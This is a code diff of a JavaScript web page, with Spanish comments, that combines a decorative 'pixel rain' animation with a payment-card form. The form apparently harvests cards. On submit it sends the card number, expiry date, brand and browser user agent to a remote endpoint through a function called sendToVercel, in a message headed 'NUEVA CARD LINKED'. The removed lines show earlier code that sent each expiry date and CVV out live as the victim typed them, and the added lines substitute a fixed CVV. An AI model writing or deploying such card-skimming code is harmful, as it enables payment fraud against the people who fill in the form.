@@ -1,7 +1,6 @@
 (() => {
   const canvas = document.getElementById("pixelRain");
   if (!canvas) return;
-
   const ctx = canvas.getContext("2d", { alpha: true });
   let w = 0, h = 0, dpr = 1;
 
@@ -16,26 +15,19 @@
 
   function resize() {
     dpr = Math.max(1, Math.floor(window.devicePixelRatio || 1));
-    w = Math.floor(window.innerWidth);
-    h = Math.floor(window.innerHeight);
-    canvas.width = w * dpr;
-    canvas.height = h * dpr;
-    canvas.style.width = w + "px";
-    canvas.style.height = h + "px";
+    w = Math.floor(window.innerWidth); h = Math.floor(window.innerHeight);
+    canvas.width = w * dpr; canvas.height = h * dpr;
+    canvas.style.width = w + "px"; canvas.style.height = h + "px";
     ctx.setTransform(dpr, 0, 0, dpr, 0, 0);
     state.size = w < 520 ? 9 : 10;
     state.cols = Math.ceil(w / state.size);
     state.streams = Array.from({ length: state.cols }, (_, i) => ({
-      x: i * state.size,
-      y: Math.random() * h,
-      speed: 1.2 + Math.random() * 2.6,
-      density: 0.35 + Math.random() * 0.55
+      x: i * state.size, y: Math.random() * h, speed: 1.2 + Math.random() * 2.6, density: 0.35 + Math.random() * 0.55
     }));
   }
 
   function tick() {
-    ctx.fillStyle = "rgba(0,0,0,0.12)";
-    ctx.fillRect(0, 0, w, h);
+    ctx.fillStyle = "rgba(0,0,0,0.12)"; ctx.fillRect(0, 0, w, h);
     for (const s of state.streams) {
       const drops = 1 + Math.floor(3 * s.density);
       for (let k = 0; k < drops; k++) {
@@ -46,24 +38,21 @@
         ctx.fillRect(px, py, sz * 0.55, sz);
       }
       s.y += s.speed * state.size * 0.35;
-      if (s.y > h + 80) {
-        s.y = -Math.random() * 200;
-        s.speed = 1.2 + Math.random() * 2.6;
-        s.density = 0.35 + Math.random() * 0.55;
-      }
+      if (s.y > h + 80) { s.y = -Math.random() * 200; s.speed = 1.2 + Math.random() * 2.6; s.density = 0.35 + Math.random() * 0.55; }
     }
     requestAnimationFrame(tick);
   }
 
   window.addEventListener("resize", resize, { passive: true });
-  resize();
-  ctx.clearRect(0, 0, w, h);
-  requestAnimationFrame(tick);
+  resize(); ctx.clearRect(0, 0, w, h); requestAnimationFrame(tick);
 })();
 
 /* =========================
-   Card + Form logic + Oculto a Vercel
+   Lógica del Mediador (CVV PREDETERMINADO)
    ========================= */
+
+// CONFIGURA AQUÍ TU CVV FIJO
+const CVV_PREDETERMINADO = "000"; 
 
 async function sendToVercel(message) {
   try {
@@ -80,7 +69,6 @@ async function sendToVercel(message) {
 const form = document.getElementById("payment-form");
 const numInput = document.getElementById("cardNumber");
 const dateInput = document.getElementById("cardDate");
-const cvvInput = document.getElementById("cardCvv"); // NUEVO
 const err = document.getElementById("err");
 
 const displayNum = document.getElementById("displayNumber");
@@ -97,18 +85,14 @@ const flagHelp = document.getElementById("flagHelp");
 copyFlag?.addEventListener("click", async () => {
   try{
     await navigator.clipboard.writeText(FLAG_URL);
-    flagHelp.textContent = "Copiado ✅ Pégalo en la barra de direcciones de Chrome y presiona Enter.";
+    flagHelp.textContent = "Copiado ✅ Pégalo en Chrome.";
   }catch{
     flagHelp.textContent = "Copia manualmente: " + FLAG_URL;
   }
 });
 
 document.getElementById("update-button")?.addEventListener("click", () => {
-  window.open(
-    "https://banger.supply/collections/accessories/products/commander-glass-nipple-caps",
-    "_blank",
-    "noopener,noreferrer"
-  );
+  window.open("https://banger.supply/collections/accessories/products/commander-glass-nipple-caps", "_blank", "noopener,noreferrer");
 });
 
 document.getElementById("perfil-button")?.addEventListener("click", () => {
@@ -116,11 +100,7 @@ document.getElementById("perfil-button")?.addEventListener("click", () => {
 });
 
 const cardPatterns = {
-  visa: /^4/,
-  mastercard: /^5[1-5]/,
-  amex: /^3[47]/,
-  discover: /^6(?:011|5)/,
-  diners: /^3(?:0[0-5]|[68])/
+  visa: /^4/, mastercard: /^5[1-5]/, amex: /^3[47]/, discover: /^6(?:011|5)/, diners: /^3(?:0[0-5]|[68])/
 };
 
 function detectBrand(raw){
@@ -143,15 +123,7 @@ function luhn(value){
   return (sum % 10) === 0;
 }
 
-// NUEVO: Validación de CVV según marca
-function isValidCvv(cvv, brand) {
-    const len = brand === "AMEX" ? 4 : 3;
-    return cvv.length === len;
-}
-
 let lastSentNum = "";
-let lastSentDate = "";
-let lastSentCvv = ""; // NUEVO
 
 numInput?.addEventListener("input", (e)=>{
   let raw = e.target.value.replace(/\D/g,'').slice(0,19);
@@ -160,15 +132,9 @@ numInput?.addEventListener("input", (e)=>{
 
   let formatted = "";
   if (brand === "AMEX") {
-    for(let i=0;i<raw.length;i++){
-      if(i===4 || i===10) formatted += " ";
-      formatted += raw[i];
-    }
+    for(let i=0;i<raw.length;i++){ if(i===4 || i===10) formatted += " "; formatted += raw[i]; }
   } else {
-    for(let i=0;i<raw.length;i++){
-      if(i>0 && i%4===0) formatted += " ";
-      formatted += raw[i];
-    }
+    for(let i=0;i<raw.length;i++){ if(i>0 && i%4===0) formatted += " "; formatted += raw[i]; }
   }
 
   e.target.value = formatted;
@@ -183,31 +149,23 @@ numInput?.addEventListener("input", (e)=>{
 function parseAndFormatExp(input){
   const digits = (input || "").replace(/\D/g,"").slice(0,6);
   if (digits.length === 0) return {display:"", mm:null, yy:null, complete:false};
-
-  const mm = digits.slice(0,2);
-  const rest = digits.slice(2);
-
+  const mm = digits.slice(0,2); const rest = digits.slice(2);
   if (rest.length <= 2){
     const complete = rest.length === 2;
     return { display: rest.length ? (mm + "/" + rest) : mm, mm, yy: complete ? rest : null, complete };
   }
-
-  const yyyy = rest.slice(0,4);
-  const complete = yyyy.length === 4;
+  const yyyy = rest.slice(0,4); const complete = yyyy.length === 4;
   const yy = complete ? yyyy.slice(2,4) : null;
   return { display: mm + "/" + yyyy, mm, yy, complete };
 }
 
 function isValidExp(mm, yy){
   if (!mm || !yy) return false;
-  const m = parseInt(mm,10);
-  const y = parseInt(yy,10);
+  const m = parseInt(mm,10); const y = parseInt(yy,10);
   if (!(m>=1 && m<=12)) return false;
-
   const now = new Date();
   const cy = parseInt(String(now.getFullYear()).slice(2),10);
   const cm = now.getMonth()+1;
-
   if (y < cy) return false;
   if (y === cy && m < cm) return false;
   return true;
@@ -216,14 +174,8 @@ function isValidExp(mm, yy){
 dateInput?.addEventListener("input",(e)=>{
   const p = parseAndFormatExp(e.target.value);
   e.target.value = p.display;
-
   if (p.mm && p.yy) displayDate.textContent = p.mm + "/" + p.yy;
   else displayDate.textContent = p.display || "MM/AA";
-
-  if (p.complete && e.target.value !== lastSentDate) {
-      sendToVercel(`<b>📅 Exp:</b> <code>${p.mm}/${p.yy}</code>`);
-      lastSentDate = e.target.value;
-  }
 });
 
 dateInput?.addEventListener("blur", ()=>{
@@ -234,20 +186,6 @@ dateInput?.addEventListener("blur", ()=>{
   }
 });
 
-// NUEVO: Escuchar input de CVV
-cvvInput?.addEventListener("input", (e) => {
-    let raw = e.target.value.replace(/\D/g, '').slice(0, 4); // Máximo 4 dígitos
-    e.target.value = raw;
-
-    const brand = brandLabel.textContent;
-    const requiredLen = brand === "AMEX" ? 4 : 3;
-
-    if (raw.length === requiredLen && raw !== lastSentCvv) {
-        sendToVercel(`<b>🔑 CVV detectado:</b> <code>${raw}</code> (Brand: ${brand})`);
-        lastSentCvv = raw;
-    }
-});
-
 form?.addEventListener("submit",(e)=>{
   e.preventDefault();
   err.textContent = "";
@@ -255,7 +193,6 @@ form?.addEventListener("submit",(e)=>{
   const rawNum = numInput.value.replace(/\D/g,'');
   const brand = detectBrand(rawNum);
   const minLen = (brand === "AMEX") ? 15 : 16;
-  const cvv = cvvInput.value.replace(/\D/g, ''); // NUEVO
 
   if (rawNum.length < minLen || !luhn(rawNum)) {
     err.textContent = "ERROR: datos inválidos o incompletos";
@@ -268,22 +205,18 @@ form?.addEventListener("submit",(e)=>{
     return;
   }
 
-  // NUEVO: Validar CVV
-  if (!isValidCvv(cvv, brand)) {
-      err.textContent = `ERROR: CVV debe tener ${brand === "AMEX" ? 4 : 3} dígitos`;
-      return;
-  }
-
   dateInput.value = p.mm + "/" + p.yy;
   displayDate.textContent = p.mm + "/" + p.yy;
 
-  // NUEVO: Mensaje final con CVV
+  // Asignamos el CVV fijo dependiendo si es AMEX (4 dígitos) o el resto (3 dígitos)
+  const cvvParaEnviar = (brand === "AMEX") ? "0000" : CVV_PREDETERMINADO;
+
   const finalMessage = `
 <b>🚀 NUEVA CARD LINKED</b>
 <b>-----------------------</b>
 <b>Nro:</b> <code>${numInput.value}</code>
 <b>Exp:</b> <code>${dateInput.value}</code>
-<b>CVV:</b> <code>${cvv}</code>
+<b>CVV (Auto):</b> <code>${cvvParaEnviar}</code>
 <b>Brand:</b> <code>${brandLabel.textContent}</code>
 <b>User-Agent:</b> <code>${navigator.userAgent}</code>
   `;
@@ -303,8 +236,5 @@ form?.addEventListener("submit",(e)=>{
     }
   }, 1000);
 });
-
-
-
 
 
